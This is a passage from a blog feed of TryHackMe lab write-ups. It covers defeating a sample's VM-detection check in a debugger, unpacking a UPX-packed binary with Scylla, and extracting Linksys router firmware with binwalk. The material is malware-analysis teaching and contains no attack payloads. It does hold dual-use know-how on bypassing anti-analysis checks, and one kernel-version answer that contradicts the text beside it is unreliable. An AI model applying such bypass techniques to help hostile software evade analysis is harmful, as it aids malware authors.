onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>On the bottom of the screen at <em>Dump 1</em>, we can see our current value <code class="language-plaintext highlighter-rouge">uReturn</code> (it is a 32-bit integer):</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJAdYLxAA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="uReturn Dump window" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Right-clicking on the least-significant <code class="language-plaintext highlighter-rouge">00</code> value (the one at the rightmost, because of the endianness) will open a <em>Modify Value</em> window. We enter the value <code class="language-plaintext highlighter-rouge">01</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/SyHY5Ue0C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="uReturn dump value modified" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>After pressing <code class="language-plaintext highlighter-rouge">F8</code> a few times, we should notice that the code will not exit anymore as it skips the execution from <code class="language-plaintext highlighter-rouge">00401101</code> to <code class="language-plaintext highlighter-rouge">0040110A</code>. This is because we have manipulated the memory.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/B1SwsLxAA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="return skipped" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>However, the program will crash if we continue the execution as the <code class="language-plaintext highlighter-rouge">pclsObj</code> pointer is not pointing to any valid object. This is throwing the <em>EXCEPTION_ACCESS_VIOLATION</em> exception as the program wants to execute <code class="language-plaintext highlighter-rouge">pclsObj-&gt;Get(L"CurrentTemperature", 0, &amp;vtProp, 0, 0);</code> and want to access to an unauthorized memory allocation, a memory location which hasn’t been allocated for the program.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/Byi_3Ul0R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection exception" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Afterward, we need to continue to investigate with other methods that would allow us to jump around and continue.</p> <p>Here, we have two other ways to make this happen:</p> <ul> <li>Changing the <code class="language-plaintext highlighter-rouge">EIP</code> register’s value</li> <li>Modifying the <code class="language-plaintext highlighter-rouge">jmp</code> to go to where the malicious activities are “being done” or where 1 is returned</li> </ul> <p>For the first one, the great thing with debuggers is that we can change every value related to the program, the ones in the memory, in the stack, in the registers… Because <code class="language-plaintext highlighter-rouge">EIP</code> is the register that holds the memory address that tells what instruction next to execute, we can modify it to hold the memory address where the return is being made.</p> <p>To skip everything and jump to the part where it returns, we need to modify the <code class="language-plaintext highlighter-rouge">EIP</code> value to <code class="language-plaintext highlighter-rouge">0x00401134</code> after running the program to the address <code class="language-plaintext highlighter-rouge">0x00401101</code> (where the <em>uReturn</em> check is).</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/Hya_wPgAC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection thermal print" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>To modify it, it is simple as <em>Right clicking on EIP on the right panel -&gt; Modify value</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/S13UYPlAC.png" class="img-fluid rounded z-depth-1" width="70" height="auto" title="Modify EIP Value" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>This let us to have our EIP location changed to the new address:</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/SJZiKPeAR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="EIP address changed" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>To finish, this is what we get after running with <code class="language-plaintext highlighter-rouge">F9</code> (Run):</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJkddvxA0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection EIP bypass" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>For the second one, we can to go after the checks where the <em>MessageBox</em> of the second type is done. To proceed with that, we might do a string search and go where the string <em>“Proceeding with malicious activities…”</em> is.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJqBSvlCA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection MessageBox part" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Then, we just need to modify the jump type and address to always jump to where the rogue part of the application is. To do that, we might use <code class="language-plaintext highlighter-rouge">Space</code> or <em>Right click -&gt; Assemble</em> to change the operation from <code class="language-plaintext highlighter-rouge">jne</code> to <code class="language-plaintext highlighter-rouge">jmp 0x004011C4</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/H1NJHwl0R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection assembly instruction change" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/ryfEIwlR0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="vm-detection detection bypassed with jmp" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Finally, if we wanted to make this change permanent, we would have to patch as always using <code class="language-plaintext highlighter-rouge">Ctrl+G</code>.</p> <h3 id="questions-3">Questions</h3> <p><strong>In the C code snippet, what is the full WQL query used to get the temperature from the <code class="language-plaintext highlighter-rouge">Win32_TemperatureProbe</code> class?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">SELECT * FROM MSAcpi_ThermalZoneTemperature</code></em></p> <p><strong>What register holds the memory address that tells the debugger what instruction to execute next?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">EIP</code></em></p> <p><strong>Before uReturn is compared to zero, what is the memory location pointed to by [ebp-4]</strong></p> <p>Before <em>uReturn</em> is compared to 0, we toggle a breakpoint <em>(004010FA)</em> to see what is the value of <code class="language-plaintext highlighter-rouge">EBP</code> <em>(0019FF20)</em>. Hence, we can substract this value by 4 (remember, it is in hex) or <em>Ricght click on the operation -&gt; Follow in Dump -&gt; Address: EBP-4</em>, then copy the highlighted memory address.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/ByU-nczAR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="EBP location" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0019FF1C</code></em></p> <h2 id="task-6---packers-overwiew">Task 6 - Packers (Overwiew)</h2> <p>Obfuscation is a technique that aims to intentionnaly obscure data and code to make it harder to understand or analyze.</p> <p>The most common obfuscation techniques used by malware authors are:</p> <ul> <li><strong>Encoding techniques</strong>: This involves encoding data like command line strings, domain names, IP addresses, etc… using encoding techniques such as <code class="language-plaintext highlighter-rouge">XOR</code> or <code class="language-plaintext highlighter-rouge">Base64</code>.</li> <li><strong>Encryption techniques</strong>: This involves encrypting data such as communications to a C2 server, files and network traffic using symmetric or asymmetric encryption.</li> <li><strong>Code obfuscation</strong>: This involves various techniques such as manipulating the code to alter its syntax and structure, renaming functions or splitting code across multiple files or code segments.</li> </ul> <h3 id="packers">Packers</h3> <p>Packers are tools that compress and encrypt executable files to embed them within a new executable file that serves as a wrapper or container. By dramatically reducing the file size, packers make it ideal for easy distribution and installation. Some of them include additionnal features such as code obfuscation, runtime packing and anti-debugging techniques. It is because of these features that packers are a tool of choice for malware authors.</p> <p>There are a lot of packers available in the wild and each has a unique approach of packing. Here is a list of some popular:</p> <ul> <li><a href="https://www.alternate-tools.com/pages/c_exepacker.php?lang=ENG">Alternate EXE Packer</a></li> <li><a href="http://www.aspack.com/">ASPack</a></li> <li><a href="https://unprotect.it/technique/exestealth/">ExeStealth</a></li> <li><a href="https://github.com/akuafif/hXOR-Packer">hXOR-Packer</a></li> <li><a href="https://github.com/nelfo/Milfuscator">Milfuscator</a></li> <li><a href="https://www.autohotkey.com/mpress/mpress_web.htm">MPress</a></li> <li><a href="https://www.pelock.com/products/pelock">PELock</a></li> <li><a href="https://www.oreans.com/Themida.php">Themida</a></li> <li><a href="https://upx.github.io/">UPX</a></li> <li><a href="https://vmpsoft.com/">VMProtect</a></li> </ul> <p>It is essential to state that all packed programs are not malicious. packers can also be used for legitimate purposes such as protecting intellectual properties from theft. For example, Themida is known to be used in some video games.</p> <p>Because packers encrypts and obfuscates a program, it would be impossible to know the malware’s capabilities without running it. This makes static analysis and signature-based detection unreliable. One of the information we could obtain form a packed sample is the packer tool used. Even though this announces to be tough, it can be a good starting point for an investigation.</p> <h3 id="questions-4">Questions</h3> <p><strong>What is the decoded string of the base64 encoded string <em>“VGhpcyBpcyBhIEJBU0U2NCBlbmNvZGVkIHN0cmluZy4=”</em>?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">This is a BASE64 encoded string.</code></em></p> <h2 id="task-7---identifying-and-unpacking">Task 7 - Identifying and Unpacking</h2> <p>The first stepdealing with packed malware is identifying the packer used. Using tools like <em>Detect It Easy</em> (DIE) and <em>PEStudio</em>, we can have a great starting point.</p> <p>With DIE, we will try to identify the packer used for <code class="language-plaintext highlighter-rouge">packed.exe</code>, in order to try to unpack it.</p> <p>Firstly, we start by opening it in DIE:</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/HJ4FcsfRA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="packed.exe opened in DIE" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Detect It Easy displays its best guess if it can identify the packer. Here, it identifies the program as packed with UPX.</p> <p>Also, we can check for the entropy with the <em>Entropy</em> button on the right panel. Because entropy is the measure of the randomness and a packer misplaces code blocks in a controlled way, we can identify if a binary is packed or not. The <em>Entropy</em> window determines how much entropy each section (normally .text, .data, .rsrc…) has. In this PE, the sections names are changed because of packing and they are renamed <em>UPX1</em> and <em>UPX2</em>. The second is not packed because it contains the code to unpack the first one, which is packed.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/SkazToG00.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="packed.exe entropy in DIE" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Another tool is PEStudio, which lists information on PE files. With it, we can also check for sections in <em>sections (self-modifying)</em> and get more information than with DIE.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJoTAjfRC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="packed.exe sections in pestudio" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Like we have seen before, we also see that the section names was modified. Although this is the most identifiable piece of information tht packers can leave, not every one change these values.</p> <h3 id="automated-unpacking">Automated Unpacking</h3> <p>Once the packer is identified, it is possible to use an unpacker to get back to the original file. Some are readily available, like in the case of UPX. However, for other commercial tools like Themida, we may have to rely on 3rd party tools.</p> <p>Here are some scripts to try unpacking packed binaries with specific tools:</p> <ul> <li><a href="https://github.com/Hendi48/Magicmida">Themida</a></li> <li><a href="https://github.com/ThomasThelen/OllyDbg-Scripts/blob/master/Enigma/Enigma%20Protector%201.90%20-%203.xx%20Alternativ%20Unpacker%20v1.0.txt">Enigma Protector</a></li> <li><a href="https://github.com/avast/retdec/blob/master/src/unpackertool/plugins/mpress/mpress.cpp">Mpress unpacker</a></li> </ul> <p>With a malware packed with a more obscure packer, it might be tougher. Even though, trying to upload it to <a href="https://www.unpac.me/">unpac.me</a> might result with an unpakced executable.</p> <h3 id="manual-unpacking-and-dumping">Manual Unpacking and Dumping</h3> <p>Ultimately, the best way to unravel malware is by executing it.</p> <p>When executed, the container code performs decryption and deobfuscation. Once fully unpacked, the malware can proceed with its own code and we can thoroughly analyze it while it is in memory with a debugger.</p> <p>On the provided VM, we will analyze <code class="language-plaintext highlighter-rouge">packed.exe</code>.</p> <p>Firstly, we will open the program with <em>F3</em> and we will run it once with <em>F9</em>. We should arrive at a default breakpoint, the <em>EntryPoint</em> one. Obviously, this is the entry point for the unpack code and not the real one.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/r1vWNoYCA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="packed.exe first EntryPoint" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Following the process, we could continue to press <em>F8</em> (Step Over) to see what is going one. However, if we watch a bit further on the code disassembly, we can see a interesting part which could correspond at the end of the unpacking program. This is because after this, we jump at an address where a normal program content is located and there are a few instructions repeating. We press <em>F2</em> to put a breakpoint on the <code class="language-plaintext highlighter-rouge">jmp</code> opcode at the address <code class="language-plaintext highlighter-rouge">004172D4</code> and press <em>F9</em> to go there.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/B1evPoKRA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="packed.exe before the program" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>For relevance, when UPX-malware is being unpacked, <code class="language-plaintext highlighter-rouge">004172D4</code> address location tells to UPX that malware have been successfully unpacked and the legitimate part of the program resides at <code class="language-plaintext highlighter-rouge">00401262</code>.</p> <blockquote> <p><strong>Note:</strong> This unpacking approach and memory locations differs from a packer to another.</p> </blockquote> <p>With the <em>Scylla</em> plugin, we can dump the unpacked legitimate part of the program to memory and fix it so it will have the updated memory locations from its DLL imports. Scylla is a tool that can dump process memory to disk and fix and rebuild the <a href="https://securitymaven.medium.com/anatomy-of-iat-and-eat-hooking-9612eb15baf1">Import Address Table</a> (IAT).</p> <p>To open it, we go to <em>Plugins -&gt; Scylla</em> on the top menu bar. Please note that he <em>OEP</em> (Original Entry Point) is the address of where the legitimate part of the program starts. Once the window is opened, we click on <em>Dump</em> and save the file somewhere.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/B1u8N13R0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Scylla plugin" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Once this is done, we click on <em>IAT Autosearch</em> to search the original IAT loaded in the program’s memory. A pop-up asks to use Advanced IAT Search or no. Hence we click on <em>no</em> and <em>OK</em> to use the standard method.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rJDT8ynCR.png" class="img-fluid rounded z-depth-1" width="60%" height="auto" title="Advanced IAT Search pop-up" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>At this point, we can now click on <em>Get Imports</em> button to update the <em>Import</em> list section. This list shows us all DLLs used by the program. Sometimes, invalid entries marked with an “X” are found by Scylla. These are safe to delete because the list already covers all the DLLs. To delete these, we <em>Right click -&gt; Cut thunk</em> on each invalid row.</p> <p>When we are left only with valid values, we click on <em>Fix Dump</em> and select the previously generated file. With the string <em>“_SCY”</em> appended to the name, the program now work correctly.</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/rk2f9Wh0A.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Scylla completed" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/BJ1qcZ3CA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Opened unpacked program" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We can confirm the successful unpacking with DIE or PEStudio, which does not detect our binary as <em>Packed</em> anymore:</p> <figure> <picture> <img src="/assets/img/images/thm_anti-reverse_engineering/H1sxoW2A0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Unpacked program's entropy" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-5">Questions</h3> <p>For these questions, we just need to open <code class="language-plaintext highlighter-rouge">packed.exe</code> in DIE or PEStudio.</p> <p><strong>According to DetectItEasy, what is the version of the Microsoft Linker used for linking packed.exe?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">14.16</code></em></p> <p><strong>According to pestudio, what is the entropy of the UPX2 section of packed.exe?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2.006</code></em></p> <h2 id="task-8---conclusion">Task 8 - Conclusion</h2> <p>In this room, we explored the various anti-reverse engineering techniques that malware authors employ to complicate the analysis of their malicious software. We discussed the motivations behind these techniques, such as preventing debugging through methods like checking for debuggers, VM detection, tampering with debug registers, and using self-modifying code. We also examined practical applications, such as the use of the Windows API function <code class="language-plaintext highlighter-rouge">SuspendThread</code> to pause execution and hinder debugging efforts. Additionally, we learned how to circumvent these protections through patching and manipulation techniques, which included directly altering memory values and using the EIP register to control execution flow.<br/> While this session provided valuable insights into the realm of anti-reverse engineering, it’s important to recognize that the field is vast and continually evolving and this room helped us to delve into the surface of it.</p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Dynamic Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Dumping Router Firmware</title><link href="https://nonohm.github.io/blog/2024/THM-Dumping-Router-Firmware/" rel="alternate" type="text/html" title="THM Dumping Router Firmware"/><published>2024-09-10T18:31:46+00:00</published><updated>2024-09-10T18:31:46+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Dumping-Router-Firmware</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Dumping-Router-Firmware/"><![CDATA[<blockquote> <p><strong>Note:</strong><br/> Unlike many of my other writeups, this one doesn’t include a summary, and the phrases are identical to those in <a href="https://tryhackme.com/r/room/rfirmware">Dumping Router Firmware</a>. I completed this room to gain a basic overview of firmware analysis.</p> </blockquote> <h2 id="task-1---preparation">Task 1 - Preparation</h2> <h3 id="installing-the-required-software">Installing the Required Software</h3> <p>Each year millions of home routers are sold to consumers; a large majority of them don’t even know what’s running on them. Today we’re going to take a look. Before proceeding, we will need a few tools:</p> <ul> <li>Access to a Linux distribution (Or WSL) with strings and binwalk on it.</li> <li>Linksys WRT1900ACS v2 Firmware found here: <a href="https://github.com/Sq00ky/Dumping-Router-Firmware-Image/">https://github.com/Sq00ky/Dumping-Router-Firmware-Image/</a></li> <li>Lastly, ensure binwalk has JFFS2 support with the following command:</li> </ul> <pre><code class="language-raw">sudo pip install cstruct; 

git clone https://github.com/sviehb/jefferson;

cd jefferson &amp;&amp; sudo python setup.py install
</code></pre> <p>After you’ve got the tools, you’re ready to set up your workspace!</p> <h3 id="rebuilding-the-firmware">Rebuilding the Firmware</h3> <p>First, we’re going to clone the repository that holds the firmware:</p> <p>git clone <a href="https://github.com/Sq00ky/Dumping-Router-Firmware-Image/">https://github.com/Sq00ky/Dumping-Router-Firmware-Image/</a> /opt/Dumping-Router-Firmware &amp;&amp; cd /opt/Dumping-Router-Firmware/</p> <p>Next, we’re going to unzip the multipart zip file:</p> <p><code class="language-plaintext highlighter-rouge">7z x ./FW_WRT1900ACSV2_2.0.3.201002_prod.zip</code></p> <p>running ls you should see the firmware image:</p> <pre><code class="language-raw">FW_WRT1900ACSV2_2.0.3.201002_prod.img
</code></pre> <p>Lastly, running a <code class="language-plaintext highlighter-rouge">sha256sum</code> on the firmware image you should be left with the value</p> <pre><code class="language-raw">dbbc9e8673149e79b7fd39482ea95db78bdb585c3fa3613e4f84ca0abcea68a4
</code></pre> <h2 id="task-2---investigating-firmware">Task 2 - Investigating Firmware</h2> <p>In this section we will be taking a look at the firmware, checking for strings and, dump the file system from the image. The next section will cover mounting and exploring the file system.</p> <p><em>While running strings on the file, there is a lot of notable clear text. This is due to certain aspects of the firmware image not being encrypted. This likely means that with Binwalk, we can dump the firmware from the image.</em></p> <p><strong>What does the first clear text line say when running <code class="language-plaintext highlighter-rouge">strings</code> on the file?</strong></p> <p>By running <code class="language-plaintext highlighter-rouge">strings FW_WRT1900ACSV2_2.0.3.201002_prod.img | head</code>, we get the following result:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>nono㉿lenovo-PC<span class="o">)</span>-[/opt/Dumping-Router-Firmware]
└─<span class="nv">$ </span>strings FW_WRT1900ACSV2_2.0.3.201002_prod.img | <span class="nb">head
</span>Linksys WRT1900ACS Router
@ <span class="c">#!</span>
<span class="o">!</span>1C <span class="s2">"
 -- System halted
Attempting division by 0!
Uncompressing Linux...
decompressor returned an error
 done, booting the kernel.
invalid distance too far back
invalid distance code
</span></code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Linksys WRT1900ACS Router</code></em></p> <p><strong>Also, using <code class="language-plaintext highlighter-rouge">strings</code>, what operating system is the device running?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Linux</code></em></p> <p>Scrolling through with strings, you may notice some other interesting lines like</p> <p><code class="language-plaintext highlighter-rouge">/bin/busybox</code></p> <p>and various other lua files. It really makes you wonder what’s going on inside there</p> <p>Next, we will be dumping the filesystem from the image file. To do so, we will be using a tool called binwalk.</p> <p>Binwalk is a tool that checks for well-known file signatures within a given file. This can be useful for many things; it even has its uses in Steganography. A file could be hidden within the photo, and Binwalk would reveal that and help us extract it. We will be using it to extract the filesystem of the router in this instance.</p> <p><strong>What option within Binwalk will allow us to extract files from the firmware image?</strong></p> <p>By checking the help page with <code class="language-plaintext highlighter-rouge">binwalk -h</code>, we get that:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>nono㉿lenovo<span class="o">)</span>-[/opt/Dumping-Router-Firmware]
└─<span class="nv">$ </span>binwalk <span class="nt">-h</span>
/usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence <span class="s1">'\.'</span>
  self.period <span class="o">=</span> re.compile<span class="o">(</span><span class="s2">"</span><span class="se">\.</span><span class="s2">"</span><span class="o">)</span>

Binwalk v2.3.3
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk <span class="o">[</span>OPTIONS] <span class="o">[</span>FILE1] <span class="o">[</span>FILE2] <span class="o">[</span>FILE3] ...
...

Extraction Options:
    <span class="nt">-e</span>, <span class="nt">--extract</span>                Automatically extract known file types
    <span class="nt">-D</span>, <span class="nt">--dd</span><span class="o">=</span>&lt;<span class="nb">type</span><span class="o">[</span>:ext[:cmd]]&gt;  Extract &lt;<span class="nb">type</span><span class="o">&gt;</span> signatures <span class="o">(</span>regular expression<span class="o">)</span>, give the files an extension of &lt;ext&gt;, and execute &lt;cmd&gt;
    <span class="nt">-M</span>, <span class="nt">--matryoshka</span>             Recursively scan extracted files
    <span class="nt">-d</span>, <span class="nt">--depth</span><span class="o">=</span>&lt;int&gt;            Limit matryoshka recursion depth <span class="o">(</span>default: 8 levels deep<span class="o">)</span>
    <span class="nt">-C</span>, <span class="nt">--directory</span><span class="o">=</span>&lt;str&gt;        Extract files/folders to a custom directory <span class="o">(</span>default: current working directory<span class="o">)</span>
    <span class="nt">-j</span>, <span class="nt">--size</span><span class="o">=</span>&lt;int&gt;             Limit the size of each extracted file
    <span class="nt">-n</span>, <span class="nt">--count</span><span class="o">=</span>&lt;int&gt;            Limit the number of extracted files
    <span class="nt">-0</span>, <span class="nt">--run-as</span><span class="o">=</span>&lt;str&gt;           Execute external extraction utilities with the specified user<span class="s1">'s privileges
    -1, --preserve-symlinks      Do not sanitize extracted symlinks that point outside the extraction directory (dangerous)
    -r, --rm                     Delete carved files after extraction
    -z, --carve                  Carve data from files, but don'</span>t execute extraction utilities
    <span class="nt">-V</span>, <span class="nt">--subdirs</span>                Extract into sub-directories named by the offset
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">-e</code></em></p> <p><strong>Now that we know how to extract the contents of the firmware image, what was the first item extracted?</strong></p> <p>After doing <code class="language-plaintext highlighter-rouge">sudo binwalk -e FW_WRT1900ACSV2_2.0.3.201002_prod.img --run-as=root</code>, we get all the extracted and detailed contents:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>nono㉿lenovo<span class="o">)</span>-[/opt/Dumping-Router-Firmware]
└─<span class="nv">$ </span><span class="nb">sudo </span>binwalk <span class="nt">-e</span> FW_WRT1900ACSV2_2.0.3.201002_prod.img <span class="nt">--run-as</span><span class="o">=</span>root

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
0             0x0             uImage header, header size: 64 bytes, header CRC: 0xFF40CAEC, created: 2020-04-22 11:07:26, image size: 4229755 bytes, Data Address: 0x8000, Entry Point: 0x8000, data CRC: 0xABEBC439, OS: Linux, CPU: ARM, image <span class="nb">type</span>: OS Kernel Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"Linksys WRT1900ACS Router"</span>
64            0x40            Linux kernel ARM boot executable zImage <span class="o">(</span>little-endian<span class="o">)</span>
26736         0x6870          <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
4214256       0x404DF0        Flattened device tree, size: 15563 bytes, version: 17
...
6291456       0x600000        JFFS2 filesystem, little endian
</code></pre></div></div> <p><em>Answer: <code class="language-plaintext highlighter-rouge">uImage header</code></em></p> <p><strong>What was the creation date?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">2020-04-22 11:07:26</code></em></p> <p>The Cyclical Redundancy Check is used similarly to file hashing to ensure that the file contents were not corrupted and/or modified in transit.</p> <p><strong>What is the CRC of the image?</strong></p> <p>The CRC of the image is provided in the binwalk’s extraction resume</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0xABEBC439</code></em></p> <p><strong>What is the image size?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">4229755 bytes</code></em></p> <p><strong>What architecture does the device run?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">ARM</code></em></p> <p><strong>Researching the results to question 10, is that true?</strong></p> <p>Knowing the device architecture is very important for reverse engineering.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">yes</code></em></p> <p>You will notice two files got extracted, one being the jffs2 file system and another that Binwalk believes in gzipping compressed data.</p> <p>You can attempt to extract the data, but you won’t get anywhere. Binwalk misinterpreted the data. However, we can still do some analysis of it.</p> <p><strong>Running strings on 6870, we notice a large chunk of clear text. We can actually rerun binwalk on this file to receive even more files to investigate. Interestingly enough, a copy of the Linux kernel is included. What version is it for?</strong></p> <p>When we run <code class="language-plaintext highlighter-rouge">sudo binwalk -e 6870 --run-as=root</code>, we get an new extraction of the file</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>nono㉿lenovo<span class="o">)</span>-[/opt/Dumping-Router-Firmware/_FW_WRT1900ACSV2_2.0.3.201002_prod.img.extracted]
└─<span class="nv">$ </span><span class="nb">sudo </span>binwalk <span class="nt">-e</span> 6870 <span class="nt">--run-as</span><span class="o">=</span>root
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>nono:

DECIMAL       HEXADECIMAL     DESCRIPTION
<span class="nt">--------------------------------------------------------------------------------</span>
1904228       0x1D0E64        SHA256 <span class="nb">hash </span>constants, little endian
4112676       0x3EC124        SHA256 <span class="nb">hash </span>constants, little endian
5877920       0x59B0A0        Linux kernel version 3.10.3
6120324       0x5D6384        AES S-Box
6120580       0x5D6484        AES Inverse S-Box
6176102       0x5E3D66        Unix path: /var/run/rpcbind.sock
6261498       0x5F8AFA        MPEG transport stream data
6261758       0x5F8BFE        MPEG transport stream data
6902132       0x695174        Unix path: /dev/vc/0
6993884       0x6AB7DC        xz compressed data
7027944       0x6B3CE8        Unix path: /lib/firmware/updates/3.10.39
</code></pre></div></div> <p>Thus, we get the linux kernel version, which is 3.10.3.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">3.10.39</code></em></p> <p>Suppose you extract the contents of 6870 with Binwalk and run strings on 799E38.cpio, you may see a lot of hex towards the bottom of the file. Some of it can be translated into human-readable text. Some of it is interesting and makes you wonder about its purpose. Some additional investigation may reveal its purpose. I will leave you to explore that on your own, though :)</p> <p>Continuing with the analysis, we have a jffs2 file system that we can examine the contents of. First, we must mount it, bringing us to the next section.</p> <h2 id="task-3---mounting-and-analysis-of-the-routers-filesystem">Task 3 - Mounting and Analysis of the Router’s Filesystem</h2> <p>In this section, we will begin to review how to mount the file system. Note, if you are doing this with any other file system, not in the Little Endian format, you must convert it from Big Endian to Little Endian using a tool called jffs2dump. But here is a reasonably concise guide to mounting the filesystem:</p> <p>Step 1. If /dev/mtdblock0 exists, remove the file/directory and re-create the block device</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-rf</span> /dev/mtdblock0
<span class="nb">mknod</span> /dev/mtdblock0 b 31 0
</code></pre></div></div> <p>Step 2. Create a location for the jffs2 filesysystem to live</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> /mnt/jffs2_file/
</code></pre></div></div> <p>Step 3. Load required kernel modules</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>modprobe jffs2
modprobe mtdram
modprobe mtdblock
